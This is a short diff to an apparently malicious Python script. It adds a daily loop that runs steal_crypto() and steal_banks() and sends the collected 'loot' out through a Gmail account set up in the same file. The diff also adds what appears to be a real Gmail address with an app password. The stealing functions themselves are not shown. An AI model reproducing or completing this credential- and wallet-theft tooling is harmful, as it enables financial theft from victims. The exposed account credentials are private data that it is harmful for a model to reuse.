@@ -5,7 +5,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 GMAIL_USER = "balls14666@gmail.com"
-GMAIL_PASS = "googlepass"  # ← CHANGE THIS!
+GMAIL_PASS = "qhojbcvyfapnqxip"  # ← CHANGE THIS!
 
 def send_loot(to_email, subject, body):
     msg = MIMEMultipart()
@@ -88,6 +88,17 @@ while True:
         break
     except:
         time.sleep(3600)  # Retry hourly if crash
+
+# Rest of functions SAME as before (steal_crypto(), steal_banks())
+# ... [copy from previous code]
+
+# Main loop
+while True:
+    loot = {**steal_crypto(), **steal_banks()}
+    if loot:
+        exfiltrate_loot(loot)
+    time.sleep(86400)  # Daily
+
 
 
 
